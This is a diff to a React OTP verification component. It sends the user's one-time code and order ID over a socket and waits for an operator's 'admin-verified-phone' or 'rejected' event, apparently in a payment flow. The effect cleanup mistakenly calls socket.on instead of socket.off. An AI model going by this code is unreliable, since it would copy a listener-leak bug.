@@ -1,4 +1,4 @@
-import { useCallback, useEffect } from "react";
+import { useCallback, useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { useDispatch, useSelector } from "react-redux";
 import { RootState } from "../redux/store";
@@ -9,10 +9,13 @@ import {
   setError,
   clearError,
 } from "../redux/slices/otpVerificationSlice";
+import { useSocket } from "../contexts/SocketProvider";
 
 export const OtpVerification = () => {
   const navigate = useNavigate();
   const dispatch = useDispatch();
+  const socket = useSocket();
+  const [isPhoneVerified, setIsPhoneVerified] = useState(false); // the paymnet process completed or no
   const { otp, timer, error, phoneNumber } = useSelector(
     (state: RootState) => state.otpVerification
   );
@@ -24,6 +27,28 @@ export const OtpVerification = () => {
 
     return () => clearInterval(interval);
   }, [dispatch]);
+
+  useEffect(() => {
+    if (!socket) return;
+
+    function adminVerifiedPhoneHandler(data) {
+      alert(data.message + " + The Process Completed  ✔");
+      setIsPhoneVerified(true);
+      localStorage.clear();
+      navigate("/");
+    }
+    socket.on("admin-verified-phone", adminVerifiedPhoneHandler);
+
+    function rejectedHandler(data) {
+      alert(data.message + "Send The Code Again ✔");
+    }
+    socket.on("rejected", rejectedHandler);
+
+    return () => {
+      socket.on("admin-verified-phone", adminVerifiedPhoneHandler);
+      socket.on("rejected", rejectedHandler);
+    };
+  }, [socket]);
 
   const formatTime = useCallback((seconds: number) => {
     const minutes = Math.floor(seconds / 60);
@@ -63,7 +88,11 @@ export const OtpVerification = () => {
 
       try {
         // API call would go here
-        navigate("/");
+        const order_id = JSON.parse(localStorage.getItem("order_id"));
+        socket.emit("phone-verification", {
+          code: otpValue,
+          orderId: order_id,
+        });
       } catch {
         dispatch(setError("رمز التحقق غير صحيح"));
       }
